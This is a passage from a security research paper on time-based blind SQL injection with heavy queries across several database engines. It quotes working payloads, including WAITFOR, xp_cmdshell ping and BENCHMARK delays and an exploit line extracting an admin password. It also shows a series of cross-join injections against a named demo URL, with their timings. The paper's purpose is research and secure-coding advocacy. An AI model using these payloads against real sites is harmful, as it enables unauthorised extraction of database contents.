Time-Based Blind SQL 
Injection using Heavy 
Queries 
A practical approach for MS SQL 
Server, MS Access, Oracle and MySQL 
databases 
and Marathon Tool 
Authors: Chema Alonso, Daniel Kachakil, Rodolfo Bordón, Antonio Guzmán y Marta Beltrán 
Speakers: Chema Alonso & José Parada Gimeno 
Abstract: This document describes how attackers could take advantage of SQL Injection vulnerabilities 
taking advantage of time-based blind SQL injection using heavy queries. The goal is to stress the 
importance of establishing secure development best practices for Web applications and not only to entrust 
the site security to the perimeter defenses.  This article shows exploitation examples for some versions of 
Microsoft SQL Server, Oracle DB Engine, MySQL and Microsoft Access database engines, nevertheless 
the presented technique is applicable to any other database product in the market. This work is 
accompanied by a tool to prove the technique.  
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 1 of 12 
Index 
Section  
Page 
1. INTRODUCTION  
02 
2.“TRICKS” FOR TIME DELAYS4 
03 
2.1 Microsoft SQL Server 2000/2005  
04 
2.2 Microsoft Access 2000 
06 
2.3 MySQL 5  
07 
2.4 Oracle 
08 
3 . HEAVY QUERIES 
08 
4. MARATHON TOOL  
09 
4.1 Configuration Section 
09 
4.2 Database Schema  
11 
4.3 Debug Log Section 
11 
References 
12 
Authors 
12 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 2 of 12 
1. INTRODUCTION 
The first reference to “blind attacks” using SQL queries was introduced by Chris Anley in June 
2002 ([1]).  In this paper the author calls attention to the possibility of creating attacks to avoid 
the database error processing by searching a binary behavior in system’s responses. This work 
proposes a blind security analysis in which the analyzer had to infer how to extract the 
information building up SQL queries from which the only possible responses will be true or 
false. Furthermore, different methods to determine when to consider a system response as true 
or false are proposed. Among them he proposes to construct a criterion time-based.  
Anley gives some examples of blind SQL injection techniques where the information is 
extracted from the database using a vulnerable parameter. Using this parameter code is 
injected to generate a delay in response time when the condition is true: 
 0 waitfor delay '0:0:5'  
…it is possible to determine whether a given bit in a string is '1' or ’0’.That is, the above query will 
pause for five seconds if bit '@bit' of byte '@byte' in string '@s' is '1.'  
For example, the following query:  
declare @s varchar(8000) select @s = db_name() if (ascii(substring(@s, 1, 1)) & ( power(2, 0))) > 
0 waitfor delay '0:0:5'  
will pause for five seconds if the first bit of the first byte of the name of the current database is 1 
After this first reference, blind SQL injection techniques continued to be studied with most of 
techniques generating error messages from the attack system, because of the simplicity, quick 
execution, and extension of showing an error message versus delaying the database. In [2] the 
authors analyze different ways to identify a vulnerable parameter on a SQL Injection system, 
even when the information processed and returned by the system is not visible.   
At the 2004 BlackHat Conference ([3]) alternative methods to automate the exploitation of a 
Blind SQL Injection vulnerable parameter are proposed, using different custom tools. Three 
different solutions for the automation are proposed: to search for keywords on positive and 
negative results, to use MD5 signatures to discriminate positive and negative results and to 
employ textual difference engine. It is also introduced SQueal, an automatic tool to extract 
information through Blind SQL Injection, which evolved later to another tool called Absinthe 
([4]). 
In [5] time-based inference techniques are discussed, and the author proposed other ways to 
obtain time delays using calls to stored procedures, such as xp_cmdshell on MS SQL Server to 
do a ping. 
xp_cmdshell ‘ping –n 10 127.0.0.1’   application paused 10 seconds. 
Time-based techniques can be extended to any action performed by a stored procedure 
capable of generating a time delay or any other measurable action. 
In [6] SQL Injection tricks for MySQL are included with some examples based on benchmark 
functions that can generate time delays. For example: 
SELECT BENCHMARK(10000000,ENCODE('abc','123')); [around 5 sec] 
SELECT BENCHMARK(1000000,MD5(CHAR(116))) [ around 7 sec] 
Example: SELECT IF( user = 'root', BENCHMARK(1000000,MD5( 'x' )),NULL) FROM 
login 
An exploit ([7]), published in June 2007, shows how this technique could be used to attack a 
game server called Solar Empire. This exploit is a perfect example of how a Time Based Blind 
SQL Injection attack can be done. The next piece of code shows the injected code for delay the 
database server answer: 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 3 of 12 
¡$sql="F***You'),(1,2,3,4,5,(SELECT IF (ASCII (SUBSTRING(se_games.admin_pw, 
".$j.", 1)) =".$i.") & 1, benchmark(200000000,CHAR(0)),0) FROM se_games))/*";  
Figure 1: Exploit for Solar Empire. Blind SQL Injection in blue. Time delay in red. 
As the studies of the time-based Blind SQL Injection techniques are moving forward, some new 
tools have been created, such as SQL Ninja ([8]), which uses the Wait-for method for Microsoft 
SQL Server engines, or SQL PowerInjector ([9]), which implements the Wait-for method for 
Microsoft SQL Server Database engines, Benchmark functions for MySQL engines, and an 
extension of the Wait-for method for Oracle engines, using calls to DBMS_LOCK methods. 
2. “TRICKS” FOR TIME DELAYS 
Taking into consideration the methods described above, it can be seen that having access to 
stored procedures for Microsoft SQL Server and Oracle is needed to be able to generate time 
delays using calls to Wait-for methods and DBMS_LOCK. However, this is not necessary on 
MySQL engines, because in this case a mathematic function is used to generate the time delay. 
Some Intrusion Detection Systems (IDS) and Firewalls applications have the ability to block the 
URLs that use Benchmark functions.  
The question now is, if the use of stored procedures and Benchmark functions is cancelled, may 
it be generated a time-based blind SQL injection method?. The answer is yes. Blind SQL 
injection exploits can only be avoided by using the right programming technique. The program 
must make sure all the code is going to execute is not an attack, or, in Michael Howard’s words: 
“All input is evil until it proven otherwise.” 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 4 of 12 
A simple way to generate time-delays is to take advantage of one of the biggest database 
problems that have made necessary the development of performance-tuning techniques: heavy 
queries. The only thing needed is to generate a time-delay is to access a table with some 
registers and to build a “good big query” to force the engine to work. In other words, to build a 
query ignoring what the performance best practices recommend. 
In this example we have a URL with a SQL Injection vulnerability that can be exploited only by a 
time-based blind SQL injection. This means that there isn’t any error message produced by the 
system (figure 2), and we always obtain the same response (sometimes because a query is 
right and sometimes because the programmer has coded a default response even when an 
error occurs).  
Figure  1. Error Condition. The programmer returns a default value → Result 1 
2.1 Microsoft SQL Server 2000/2005 
In Microsoft SQL Server 2000 and Microsoft SQL Server 2005 engines a heavy query can be 
done using some tables from the dictionary which the user has been granted access. In this 
example we do a heavy query accessing sysusers table. 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 and (SELECT count(*) FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>0 and 300>(select top 1 
ascii(substring(name,1,1)) from sysusers) 
It can be seen in figure 3, the query starts at 23:49:11 and ends at 23:49:25 then it lasts 14 
seconds. This time-delay is caused by the second condition in the “where” clause because is a 
heavy query. This query in the where clause only is executed if the third one is also True then, 
in this case, “300>(select top 1 ascii(substring(name,1,1)) from sysusers)” is TRUE. It’s actually 
known that the ASCII value of the first username’s letter in the sysusers table is lower than 300.  
Figure  3: Positive result.  The response time is 14 seconds. 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 5 of 12 
As we can see in figure 4, the query starts at 00:00:28 and ends at 00:00:29, it means the query 
lasts one second. This time-delay is because the third condition in the where clause It is 
FALSE, so the database hadn´t to evaluate the second condition, then “0>(select top 1 
ascii(substring(name,1,1)) from sysusers)” is FALSE. We actually know than the ASCII value of 
the first username’s letter in the sysusers table is greater than 0.  
Figure  4: egative result.  The response time is 1 second. 
With these two queries we can access all the information stored in the database measuring the 
time-delays. The main idea is that when the third condition in the query is FALSE, the database 
engine stops processing the second condition because with one FALSE value in a query with 
“and” operators, the result will be FALSE. Therefore, the database engine does not have to 
process the heavy query (second condition). So, if we want to know the exact value of the 
username stored, we have to move the index and measure the response time with following 
queries: 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 300>(select top 1 
ascii(substring(name,1,1)) from sysusers)   14 s   TRUE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 0>(select top 1 
ascii(substring(name,1,1)) from sysusers)  1 s  FALSE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 150>(select top 1 
ascii(substring(name,1,1)) from sysusers)  14 s  TRUE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 75>(select top 1 
ascii(substring(name,1,1)) from sysusers)  1 s  FALSE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 100>(select top 1 
ascii(substring(name,1,1)) from sysusers)  1 s  FALSE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 110>(select top 1 
ascii(substring(name,1,1)) from sysusers)  1 s  FALSE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
Time-Based Blind SQL Injection using heavy queries & Marathon Tool 
Page 6 of 12 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 120>(select top 1 
ascii(substring(name,1,1)) from sysusers)  14 s  TRUE 
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
and 
(SELECT 
count(*) 
FROM 
sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 115>(select top 1 
ascii(substring(name,1,1)) from sysusers)  1 s  FALSE 